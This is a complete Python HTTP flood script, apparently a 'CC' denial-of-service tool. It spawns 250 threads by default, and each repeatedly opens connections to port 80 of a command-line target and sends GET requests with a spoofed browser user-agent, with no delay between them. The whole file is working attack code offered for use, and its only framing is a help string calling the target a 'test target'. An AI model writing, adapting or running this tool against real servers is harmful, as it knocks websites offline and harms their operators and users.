import os
import threading
import signal
import time
from optparse import OptionParser
from socket import * 

CC_PORT = 80
get_str ='GET / HTTP/1.1\r\nHost: %s\r\nAccept: */*\r\nContent-Length:0\r\nUser-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.125 Safari/537.36\r\nConnection:Close\r\n\r\n'

class RunCC(threading.Thread):
	def __init__(self):
		threading.Thread.__init__(self)

	def run(self):
		while True :
			cc_web()
#			time.sleep(1)

def cc_web():
	tcpCliSock = socket(AF_INET, SOCK_STREAM)
	tcpCliSock.connect((options.target, CC_PORT))
	tcpCliSock.send(get_str % (options.target))	

def ctrl_c(signalnum, frame):
	print("Dos Procedure End")
	os._exit(0)

def main():
	parser = OptionParser()
	parser.add_option("-t", "--target", action="store", dest="target", default=False, type="string", help="test target")
	parser.add_option("-x", "--threadnum", action="store", dest="threadnum", default=250, type="int", help="thread number")
	global options
	(options, args) = parser.parse_args()
	if options.target and options.threadnum:
		print ("Dos Procedure Start: CC_IP = %s, CC_PORT = %s, Threadnum = %s"%(options.target, CC_PORT, options.threadnum))
	else:
		print("Not right, CC_IP = %s"%options.target)
		return

	signal.signal(signal.SIGINT, ctrl_c)
	signal.signal(signal.SIGTERM, ctrl_c)

	CC_Dict = {}
	for threadseq in range(options.threadnum):
		CC_Dict["Thread_%s"%threadseq] = RunCC()

	for k,v in CC_Dict.items():
		v.start()

	for k,v in CC_Dict.items():
		v.join()

if __name__ == '__main__':
	main()
